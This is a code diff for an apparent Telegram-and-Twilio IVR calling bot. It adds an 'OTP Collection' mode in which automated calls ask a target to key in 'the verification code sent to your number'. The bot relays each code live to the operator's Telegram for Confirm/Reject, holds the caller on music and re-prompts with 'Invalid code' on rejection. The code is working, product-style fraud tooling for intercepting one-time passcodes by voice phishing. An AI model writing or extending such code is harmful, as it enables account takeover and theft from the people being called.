@@ -2494,6 +2494,54 @@ bot?.on('callback_query', async (query) => {
   try {
     const data = query?.data || ''
     const chatId = query?.message?.chat?.id
+
+    // ── IVR OTP Confirm/Reject handler ──
+    if (chatId && data.startsWith('ivr_otp:')) {
+      try { await bot.answerCallbackQuery(query.id) } catch (e) { /* ignore */ }
+      const parts = data.split(':')
+      const action = parts[1]     // 'confirm' or 'reject'
+      const sessionId = parts[2]
+      const voiceService = require('./voice-service.js')
+      const session = voiceService.twilioIvrSessions[sessionId]
+
+      if (!session) {
+        return bot.sendMessage(chatId, '⚠️ Session expired or call already ended.', { parse_mode: 'HTML' }).catch(() => {})
+      }
+
+      if (session.otpStatus !== 'pending_review') {
+        return bot.sendMessage(chatId, `⚠️ OTP already processed (status: ${session.otpStatus}).`, { parse_mode: 'HTML' }).catch(() => {})
+      }
+
+      if (action === 'confirm') {
+        session.otpStatus = 'confirmed'
+        // Edit original message to show decision
+        try {
+          await bot.editMessageText(
+            `✅ <b>OTP Confirmed!</b>\n\n📞 From: <b>${session.targetNumber}</b>\n🔢 Code: <code>${session.otpDigits}</code>\n\n✅ You confirmed the code. Caller will hear success message.`,
+            { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML' }
+          )
+        } catch (e) { /* message might be too old to edit */ }
+        log(`[SingleIVR-OTP] Bot user CONFIRMED OTP for session=${sessionId} digits=${session.otpDigits}`)
+        return
+      }
+
+      if (action === 'reject') {
+        session.otpStatus = 'rejected'
+        const maxAttempts = session.otpMaxAttempts || 3
+        const remaining = maxAttempts - (session.otpAttempt || 1)
+        // Edit original message to show decision
+        try {
+          await bot.editMessageText(
+            `❌ <b>OTP Rejected</b>\n\n📞 From: <b>${session.targetNumber}</b>\n🔢 Code: <code>${session.otpDigits}</code>\n\n${remaining > 0 ? `❌ Code rejected. Caller will be asked to re-enter (${remaining} attempt${remaining > 1 ? 's' : ''} left).` : '🚫 Code rejected. No attempts remaining — caller will be disconnected.'}`,
+            { chat_id: chatId, message_id: query.message.message_id, parse_mode: 'HTML' }
+          )
+        } catch (e) { /* message might be too old to edit */ }
+        log(`[SingleIVR-OTP] Bot user REJECTED OTP for session=${sessionId} digits=${session.otpDigits} (attempt ${session.otpAttempt}/${maxAttempts})`)
+        return
+      }
+      return
+    }
+
     if (!chatId || !data.startsWith('mp:')) {
       // Not a marketplace callback, ignore
       return
@@ -3672,6 +3720,8 @@ bot?.on('message', msg => {
     ivrObAudioPreview: 'ivrObAudioPreview',
     ivrObCallPreview: 'ivrObCallPreview',
     ivrObCustomScript: 'ivrObCustomScript',
+    ivrObSelectMode: 'ivrObSelectMode',
+    ivrObOtpLength: 'ivrObOtpLength',
 
     // Bulk IVR Campaign
     bulkSelectCaller: 'bulkSelectCaller',
@@ -14651,9 +14701,9 @@ Choose an IVR template category:`), k.of(rows))
       return send(chatId, `Enter value for <b>[${firstPh}]</b>:`, k.of(rows))
     }
 
-    // No placeholders — skip to IVR number
-    await set(state, chatId, 'action', a.ivrObEnterIvrNumber)
-    return send(chatId, `Enter the number to transfer the caller to when they press a key:\n<i>Example: +17174794833</i>`, k.of([]))
+    // No placeholders — skip to mode selection
+    await set(state, chatId, 'action', a.ivrObSelectMode)
+    return send(chatId, `📋 <b>Select Call Mode</b>\n\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\n🔑 <b>OTP Collection</b> — Prompt target for a code, you verify via Telegram\n\nBoth modes report full results.`, k.of([['🔗 Transfer'], ['🔑 OTP Collection'], ['↩️ Back']]))
   }
 
   if (action === a.ivrObSelectTemplate) {
@@ -14693,9 +14743,9 @@ Choose an IVR template category:`), k.of(rows))
       return send(chatId, `\nEnter value for <b>[${firstPh}]</b>:`, k.of(rows))
     }
 
-    // No placeholders — skip to IVR number
-    await set(state, chatId, 'action', a.ivrObEnterIvrNumber)
-    return send(chatId, `Enter the number to transfer the caller to when they press a key:\n<i>Example: +17174794833</i>`, k.of([]))
+    // No placeholders — skip to mode selection
+    await set(state, chatId, 'action', a.ivrObSelectMode)
+    return send(chatId, `📋 <b>Select Call Mode</b>\n\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\n🔑 <b>OTP Collection</b> — Prompt target for a code, you verify via Telegram\n\nBoth modes report full results.`, k.of([['🔗 Transfer'], ['🔑 OTP Collection'], ['↩️ Back']]))
   }
 
   if (action === a.ivrObFillPlaceholder) {
@@ -14730,9 +14780,66 @@ Choose an IVR template category:`), k.of(rows))
       }
     }
 
-    // All placeholders filled — go to IVR number
-    await set(state, chatId, 'action', a.ivrObEnterIvrNumber)
-    return send(chatId, `✅ All values set!\n\nEnter the number to transfer the caller to when they press a key:\n<i>Example: +17174794833</i>`, k.of([]))
+    // All placeholders filled — go to mode selection
+    await set(state, chatId, 'action', a.ivrObSelectMode)
+    return send(chatId, `✅ All values set!\n\n📋 <b>Select Call Mode</b>\n\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\n🔑 <b>OTP Collection</b> — Prompt target for a code, you verify via Telegram\n\nBoth modes report full results.`, k.of([['🔗 Transfer'], ['🔑 OTP Collection'], ['↩️ Back']]))
+  }
+
+  // Quick IVR — Select mode (Transfer vs OTP Collection)
+  if (action === a.ivrObSelectMode) {
+    if (message === 'Cancel' || message === t.cancel) return goto.submenu5()
+    if (message === '↩️ Back' || message === t.back) {
+      await set(state, chatId, 'action', a.ivrObSelectCategory)
+      const ivrOb = require('./ivr-outbound.js')
+      const catBtns = ivrOb.getCategoryButtons()
+      const rows = catBtns.map(b => [b])
+      return send(chatId, ({ en: "Choose an IVR template category:", fr: "Choisissez une catégorie de modèle IVR :", zh: "选择 IVR 模板分类：", hi: "IVR टेम्पलेट श्रेणी चुनें:" }[lang] || "Choose an IVR template category:"), k.of(rows))
+    }
+
+    const ivrObData = info?.ivrObData || {}
+
+    if (message === '🔗 Transfer') {
+      ivrObData.ivrMode = 'transfer'
+      await saveInfo('ivrObData', ivrObData)
+      await set(state, chatId, 'action', a.ivrObEnterIvrNumber)
+      return send(chatId, `🔗 <b>Transfer Mode</b>\n\nEnter the number to transfer the caller to when they press a key:\n<i>Example: +17174794833</i>`, k.of([['↩️ Back']]))
+    }
+
+    if (message === '🔑 OTP Collection') {
+      ivrObData.ivrMode = 'otp_collect'
+      ivrObData.ivrNumber = null // no transfer number for OTP mode
+      ivrObData.otpLength = 6
+      ivrObData.otpMaxAttempts = 3
+      await saveInfo('ivrObData', ivrObData)
+      await set(state, chatId, 'action', a.ivrObOtpLength)
+      return send(chatId, `🔑 <b>OTP Collection Mode</b>\n\nHow many digits should the code be?\n\n<i>Default: 6 digits</i>`, k.of([['4 digits'], ['5 digits'], ['6 digits'], ['8 digits'], ['↩️ Back']]))
+    }
+
+    return send(chatId, `Select a mode:`, k.of([['🔗 Transfer'], ['🔑 OTP Collection'], ['↩️ Back']]))
+  }
+
+  // Quick IVR — OTP digit length
+  if (action === a.ivrObOtpLength) {
+    if (message === 'Cancel' || message === t.cancel) return goto.submenu5()
+    if (message === '↩️ Back' || message === t.back) {
+      await set(state, chatId, 'action', a.ivrObSelectMode)
+      return send(chatId, `📋 <b>Select Call Mode</b>\n\n🔗 <b>Transfer</b> — When target presses the key, bridge them to your number\n🔑 <b>OTP Collection</b> — Prompt target for a code, you verify via Telegram\n\nBoth modes report full results.`, k.of([['🔗 Transfer'], ['🔑 OTP Collection'], ['↩️ Back']]))
+    }
+
+    const ivrObData = info?.ivrObData || {}
+    const digitMatch = (message || '').match(/(\d+)\s*digit/)
+    const length = digitMatch ? parseInt(digitMatch[1]) : parseInt(message)
+    if (!length || length < 1 || length > 10) {
+      return send(chatId, `Enter a valid digit count (1-10):`, k.of([['4 digits'], ['5 digits'], ['6 digits'], ['8 digits'], ['↩️ Back']]))
+    }
+    ivrObData.otpLength = length
+    await saveInfo('ivrObData', ivrObData)
+
+    // Skip to voice provider selection (no transfer number needed for OTP mode)
+    await set(state, chatId, 'action', a.ivrObSelectProvider)
+    const ttsService = require('./tts-service.js')
+    const providerBtns = ttsService.getProviderButtons().map(b => [b])
+    return send(chatId, `✅ OTP length: <b>${length} digits</b> (max 3 attempts)\n\n🎙 <b>Select Voice Provider</b>\n\nChoose your TTS engine:`, k.of(providerBtns))
   }
 
   if (action === a.ivrObEnterIvrNumber) {
@@ -14928,6 +15035,9 @@ Choose an IVR template category:`), k.of(rows))
         provider: callerProvider,
         twilioSubAccountSid: subAccountSid,
         twilioSubAccountToken: subAccountToken,
+        ivrMode: ivrObData.ivrMode || 'transfer',
+        otpLength: ivrObData.otpLength || 6,
+        otpMaxAttempts: ivrObData.otpMaxAttempts || 3,
       })
 
       if (result.error) {
@@ -24666,6 +24776,15 @@ app.post('/twilio/single-ivr-gather', async (req, res) => {
     if (digits && session.activeKeys.includes(digits)) {
       session.phase = 'transferring'
 
+      // ── OTP Collection mode: redirect to OTP gather ──
+      if (session.ivrMode === 'otp_collect') {
+        session.phase = 'otp_gather'
+        const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
+        response.redirect({ method: 'POST' }, `${selfUrl}/twilio/single-ivr-otp?sessionId=${encodeURIComponent(sessionId)}`)
+        log(`[SingleIVR] OTP mode: redirecting to OTP gather for session=${sessionId}`)
+        return res.type('text/xml').send(response.toString())
+      }
+
       if (session.bulkMode === 'report_only' || !session.ivrNumber) {
         // Report-only: notify and end
         session.phase = 'completed'
@@ -24703,6 +24822,227 @@ app.post('/twilio/single-ivr-gather', async (req, res) => {
   }
 })
 
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// OTP Collection TwiML Endpoints (Single IVR)
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+const OTP_HOLD_TIMEOUT_MS = 90000 // 90 seconds max hold while waiting for bot user decision
+const OTP_HOLD_LOOP_SECONDS = 12  // Play hold music for 12 seconds per loop iteration
+
+// TwiML: OTP Gather — prompt target to enter their verification code
+app.post('/twilio/single-ivr-otp', async (req, res) => {
+  const VoiceResponse = require('twilio').twiml.VoiceResponse
+  try {
+    const { sessionId } = req.query
+    const response = new VoiceResponse()
+    const voiceService = require('./voice-service.js')
+    const session = voiceService.twilioIvrSessions[sessionId]
+
+    if (!session) {
+      response.say('Session expired. Goodbye.')
+      response.hangup()
+      return res.type('text/xml').send(response.toString())
+    }
+
+    session.otpAttempt = (session.otpAttempt || 0) + 1
+    session.otpStatus = null
+    session.otpDigits = null
+    session.phase = 'otp_gather'
+
+    const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
+    const otpResultUrl = `${selfUrl}/twilio/single-ivr-otp-result?sessionId=${encodeURIComponent(sessionId)}`
+    const otpLength = session.otpLength || 6
+
+    log(`[SingleIVR-OTP] Gather: session=${sessionId} attempt=${session.otpAttempt}/${session.otpMaxAttempts || 3}`)
+
+    // First gather attempt
+    const gather = response.gather({
+      action: otpResultUrl,
+      method: 'POST',
+      numDigits: otpLength,
+      timeout: 15,
+      finishOnKey: '#',
+    })
+    if (session.otpAttempt === 1) {
+      gather.say('Please enter the verification code sent to your number, followed by the pound key.')
+    } else {
+      gather.say('Invalid code. Please re-enter the verification code sent to your number, followed by the pound key.')
+    }
+
+    // Retry gather if no input
+    const gather2 = response.gather({
+      action: otpResultUrl,
+      method: 'POST',
+      numDigits: otpLength,
+      timeout: 10,
+      finishOnKey: '#',
+    })
+    gather2.say('We did not receive your code. Please enter it now, followed by the pound key.')
+
+    // No input after retries
+    response.say('No code received. Goodbye.')
+    response.hangup()
+
+    res.type('text/xml').send(response.toString())
+  } catch (error) {
+    log('[SingleIVR-OTP] Gather error:', error.message)
+    const response = new VoiceResponse()
+    response.say('An error occurred. Goodbye.')
+    response.hangup()
+    res.type('text/xml').send(response.toString())
+  }
+})
+
+// TwiML: OTP Result — collect OTP digits, notify bot user, enter hold loop
+app.post('/twilio/single-ivr-otp-result', async (req, res) => {
+  const VoiceResponse = require('twilio').twiml.VoiceResponse
+  try {
+    const { sessionId } = req.query
+    const digits = req.body?.Digits || ''
+    const response = new VoiceResponse()
+    const voiceService = require('./voice-service.js')
+    const session = voiceService.twilioIvrSessions[sessionId]
+
+    log(`[SingleIVR-OTP] Result: session=${sessionId} digits=${digits} attempt=${session?.otpAttempt}`)
+
+    if (!session) {
+      response.say('Session expired. Goodbye.')
+      response.hangup()
+      return res.type('text/xml').send(response.toString())
+    }
+
+    if (!digits) {
+      response.say('No code entered. Goodbye.')
+      response.hangup()
+      return res.type('text/xml').send(response.toString())
+    }
+
+    // Store OTP and set pending review
+    session.otpDigits = digits
+    session.otpStatus = 'pending_review'
+    session.otpHoldStartedAt = Date.now()
+    session.phase = 'otp_hold'
+
+    // ── Send Telegram notification to bot user with inline Confirm/Reject buttons ──
+    const attemptText = session.otpAttempt > 1 ? ` (attempt ${session.otpAttempt}/${session.otpMaxAttempts || 3})` : ''
+    try {
+      await bot?.sendMessage(session.chatId,
+        `🔑 <b>OTP Received!</b>${attemptText}\n\n` +
+        `📞 From: <b>${session.targetNumber}</b>\n` +
+        `🔢 Code: <code>${digits}</code>\n` +
+        `📋 Template: ${session.templateName || 'Custom'}\n\n` +
+        `Caller is on hold — verify the code:`,
+        {
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Confirm', callback_data: `ivr_otp:confirm:${sessionId}` },
+                { text: '❌ Reject', callback_data: `ivr_otp:reject:${sessionId}` },
+              ]
+            ]
+          }
+        }
+      )
+    } catch (e) {
+      log(`[SingleIVR-OTP] Failed to send Telegram OTP notification: ${e.message}`)
+    }
+
+    // Redirect to hold loop
+    const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
+    response.say('Thank you. Please hold while we verify your code.')
+    response.redirect({ method: 'POST' }, `${selfUrl}/twilio/single-ivr-otp-hold?sessionId=${encodeURIComponent(sessionId)}`)
+
+    res.type('text/xml').send(response.toString())
+  } catch (error) {
+    log('[SingleIVR-OTP] Result error:', error.message)
+    const response = new VoiceResponse()
+    response.say('An error occurred. Goodbye.')
+    response.hangup()
+    res.type('text/xml').send(response.toString())
+  }
+})
+
+// TwiML: OTP Hold Loop — play hold music, check for bot user decision each iteration
+app.post('/twilio/single-ivr-otp-hold', async (req, res) => {
+  const VoiceResponse = require('twilio').twiml.VoiceResponse
+  try {
+    const { sessionId } = req.query
+    const response = new VoiceResponse()
+    const voiceService = require('./voice-service.js')
+    const session = voiceService.twilioIvrSessions[sessionId]
+
+    if (!session) {
+      response.say('Session expired. Goodbye.')
+      response.hangup()
+      return res.type('text/xml').send(response.toString())
+    }
+
+    const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
+    const holdElapsed = Date.now() - (session.otpHoldStartedAt || Date.now())
+
+    log(`[SingleIVR-OTP] Hold: session=${sessionId} status=${session.otpStatus} elapsed=${Math.round(holdElapsed / 1000)}s`)
+
+    // ── Check for timeout ──
+    if (holdElapsed > OTP_HOLD_TIMEOUT_MS) {
+      session.otpStatus = 'timeout'
+      session.phase = 'completed'
+      response.say('Verification timed out. Please try again later. Goodbye.')
+      response.hangup()
+      log(`[SingleIVR-OTP] Hold TIMEOUT for session=${sessionId}`)
+      // Notify bot user
+      bot?.sendMessage(session.chatId,
+        `⏰ <b>OTP Verification Timed Out</b>\n📞 ${session.targetNumber}\n🔢 Code: <code>${session.otpDigits}</code>\n\nCaller was disconnected after ${Math.round(OTP_HOLD_TIMEOUT_MS / 1000)}s.`,
+        { parse_mode: 'HTML' }
+      ).catch(() => {})
+      return res.type('text/xml').send(response.toString())
+    }
+
+    // ── Check for confirmed ──
+    if (session.otpStatus === 'confirmed') {
+      session.phase = 'completed'
+      response.say('Your code has been verified successfully. Thank you. Goodbye.')
+      response.hangup()
+      log(`[SingleIVR-OTP] CONFIRMED for session=${sessionId} digits=${session.otpDigits}`)
+      return res.type('text/xml').send(response.toString())
+    }
+
+    // ── Check for rejected ──
+    if (session.otpStatus === 'rejected') {
+      const maxAttempts = session.otpMaxAttempts || 3
+      if (session.otpAttempt >= maxAttempts) {
+        session.phase = 'completed'
+        response.say('Maximum verification attempts reached. Goodbye.')
+        response.hangup()
+        log(`[SingleIVR-OTP] MAX ATTEMPTS for session=${sessionId} (${session.otpAttempt}/${maxAttempts})`)
+        // Notify bot user
+        bot?.sendMessage(session.chatId,
+          `🚫 <b>OTP Max Attempts Reached</b>\n📞 ${session.targetNumber}\n🔢 Last code: <code>${session.otpDigits}</code>\n\nCaller disconnected after ${maxAttempts} failed attempts.`,
+          { parse_mode: 'HTML' }
+        ).catch(() => {})
+        return res.type('text/xml').send(response.toString())
+      }
+      // Retry — redirect to OTP gather for new attempt
+      log(`[SingleIVR-OTP] REJECTED — retry ${session.otpAttempt + 1}/${maxAttempts} for session=${sessionId}`)
+      response.redirect({ method: 'POST' }, `${selfUrl}/twilio/single-ivr-otp?sessionId=${encodeURIComponent(sessionId)}`)
+      return res.type('text/xml').send(response.toString())
+    }
+
+    // ── Still pending — play hold music and loop ──
+    response.play(`${selfUrl}/assets/hold-music-jazz.mp3`)
+    response.pause({ length: 2 })
+    response.redirect({ method: 'POST' }, `${selfUrl}/twilio/single-ivr-otp-hold?sessionId=${encodeURIComponent(sessionId)}`)
+
+    res.type('text/xml').send(response.toString())
+  } catch (error) {
+    log('[SingleIVR-OTP] Hold error:', error.message)
+    const response = new VoiceResponse()
+    response.say('An error occurred. Goodbye.')
+    response.hangup()
+    res.type('text/xml').send(response.toString())
+  }
+})
+
 // Status callback: track call outcome + bill minutes
 app.post('/twilio/single-ivr-status', async (req, res) => {
   try {
@@ -24717,7 +25057,14 @@ app.post('/twilio/single-ivr-status', async (req, res) => {
     if (session && CallStatus === 'completed') {
       const durationStr = duration > 0 ? `${Math.ceil(duration / 60)} min` : 'brief'
 
-      if (session.digitPressed) {
+      // OTP mode completion report
+      if (session.ivrMode === 'otp_collect') {
+        const otpResult = session.otpStatus === 'confirmed' ? '✅ Confirmed' : session.otpStatus === 'rejected' ? '❌ Rejected' : session.otpStatus === 'timeout' ? '⏰ Timed Out' : '—'
+        bot?.sendMessage(session.chatId,
+          `📊 <b>OTP Call Complete</b>\n📞 ${session.targetNumber}\n🔑 Mode: OTP Collection\n🔢 Last Code: <code>${session.otpDigits || 'None'}</code>\n📊 Result: ${otpResult}\n🔄 Attempts: ${session.otpAttempt || 0}/${session.otpMaxAttempts || 3}\n⏱️ Duration: ${durationStr}`,
+          { parse_mode: 'HTML' }
+        ).catch(() => {})
+      } else if (session.digitPressed) {
         bot?.sendMessage(session.chatId,
           `📊 <b>IVR Call Complete</b>\n📞 ${session.targetNumber}\n🔢 Pressed: <b>${session.digitPressed}</b>\n⏱️ Duration: ${durationStr}${session.phase === 'transferring' ? '\n🔗 Transferred to ' + session.ivrNumber : ''}`,
           { parse_mode: 'HTML' }
